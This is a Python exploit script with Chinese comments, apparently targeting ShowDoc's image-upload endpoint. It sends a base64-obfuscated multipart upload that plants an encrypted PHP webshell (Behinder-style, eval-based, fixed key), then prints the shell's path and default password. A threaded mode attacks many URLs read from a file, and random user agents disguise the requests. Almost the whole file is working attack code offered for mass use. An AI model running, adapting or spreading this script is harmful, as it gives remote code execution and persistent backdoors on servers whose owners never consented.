#! /usr/bin/env python
# -*- encoding: utf-8 -*-
import requests
import sys
from time import time
import random
import urllib3
import base64
from urllib import parse
from argparse import ArgumentParser
import threadpool


#python3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
filename = sys.argv[1]
url_list=[]


#随机ua
def get_ua():
	first_num = random.randint(55, 62)
	third_num = random.randint(0, 3200)
	fourth_num = random.randint(0, 140)
	os_type = [
		'(Windows NT 6.1; WOW64)', '(Windows NT 10.0; WOW64)',
		'(Macintosh; Intel Mac OS X 10_12_6)'
	]
	chrome_version = 'Chrome/{}.0.{}.{}'.format(first_num, third_num, fourth_num)

	ua = ' '.join(['Mozilla/5.0', random.choice(os_type), 'AppleWebKit/537.36',
				   '(KHTML, like Gecko)', chrome_version, 'Safari/537.36']
				  )
	return ua


#getshell函数
def getshell(url):
	#防止url格式混乱，增加容错率
	url=parse.urlparse(url)
	url=url.scheme + '://' + url.netloc

	#添加ua头	
	headers = {
	'User-Agent': get_ua(),
	'Content-Type':'multipart/form-data; boundary=--------------------------921378126371623762173617'
	}

	#post数据
	data = base64.b64decode("LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTkyMTM3ODEyNjM3MTYyMzc2MjE3MzYxNwpDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9ImVkaXRvcm1kLWltYWdlLWZpbGUiOyBmaWxlbmFtZT0idXBmaWxlLjw+cGhwIgpDb250ZW50LVR5cGU6IHRleHQvcGxhaW4KCjw/cGhwCkBlcnJvcl9yZXBvcnRpbmcoMCk7CnNlc3Npb25fc3RhcnQoKTsKCSRrZXk9ImQyYWMwOGM2NGI1ZGIzOGEiOwoJJF9TRVNTSU9OWydrJ109JGtleTsKCSRwb3N0PWZpbGVfZ2V0X2NvbnRlbnRzKCJwaHA6Ly9pbnB1dCIpOwoJaWYoIWV4dGVuc2lvbl9sb2FkZWQoJ29wZW5zc2wnKSkKCXsKCQkkdD0iYmFzZTY0XyIuImRlY29kZSI7CgkJJHBvc3Q9JHQoJHBvc3QuIiIpOwoJCQoJCWZvcigkaT0wOyRpPHN0cmxlbigkcG9zdCk7JGkrKykgewoJCQkJICRwb3N0WyRpXSA9ICRwb3N0WyRpXV4ka2V5WyRpKzEmMTVdOyAKCQkJCX0KCX0KCWVsc2UKCXsKCQkkcG9zdD1vcGVuc3NsX2RlY3J5cHQoJHBvc3QsICJBRVMxMjgiLCAka2V5KTsKCX0KCSRhcnI9ZXhwbG9kZSgnfCcsJHBvc3QpOwoJJGZ1bmM9JGFyclswXTsKCSRwYXJhbXM9JGFyclsxXTsKCWNsYXNzIEN7cHVibGljIGZ1bmN0aW9uIF9faW52b2tlKCRwKSB7ZXZhbCgkcC4iIik7fX0KCUBjYWxsX3VzZXJfZnVuYyhuZXcgQygpLCRwYXJhbXMpOwo/PgoKLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTkyMTM3ODEyNjM3MTYyMzc2MjE3MzYxNy0t")
	
	try:
		r=requests.post(url=url + '/index.php?s=/home/page/uploadImg',headers=headers,data=data,verify=False,timeout=10)
		if "success" in r.text and r.status_code==200:
			#获取webshell地址
			resp=r.json()
			webshell_path=resp.get('url')
			print("\033[32m[+]%s file upload success!\nwebshell_path:%s\n冰蝎3连接,默认password:m2orz\033[0m" %(url,webshell_path))
		else:
			print("\033[31m[-]%s file upload False!\033[0m" %url)
	except:
		print("\033[31m[-]%s request false!\033[0m" %url)


#多线程
def multithreading(url_list, pools=5):
	works = []
	for i in url_list:
		works.append(i)
	pool = threadpool.ThreadPool(pools)
	reqs = threadpool.makeRequests(getshell, works)
	[pool.putRequest(req) for req in reqs]
	pool.wait()


if __name__ == "__main__":
	show = r'''

	     _                      _               __ _ _                  _                 _ 
	    | |                    | |             / _(_) |                | |               | |
	 ___| |__   _____      ____| | ___   ___  | |_ _| | ___ _   _ _ __ | | ___   __ _  __| |
	/ __| '_ \ / _ \ \ /\ / / _` |/ _ \ / __| |  _| | |/ _ \ | | | '_ \| |/ _ \ / _` |/ _` |
	\__ \ | | | (_) \ V  V / (_| | (_) | (__  | | | | |  __/ |_| | |_) | | (_) | (_| | (_| |
	|___/_| |_|\___/ \_/\_/ \__,_|\___/ \___| |_| |_|_|\___|\__,_| .__/|_|\___/ \__,_|\__,_|
	                                      ______                 | |                        
	                                     |______|                |_|                        
	                 
					 		                 fileupload_exp by m2
	'''
	print(show + '\n')
	arg=ArgumentParser(description='fileupload_exp By m2')
	arg.add_argument("-u",
						"--url",
						help="Target URL; Example:http://ip:port")
	arg.add_argument("-f",
						"--file",
						help="Target URL; Example:url.txt")
	args=arg.parse_args()
	url=args.url
	filename=args.file
	start=time()
	if url != None and filename == None:
		getshell(url)
	elif url == None and filename != None:
		for i in open(filename):
			i=i.replace('\n','')
			url_list.append(i)
		multithreading(url_list,10)
	end=time()
	print('任务完成，用时%ds' %(end-start))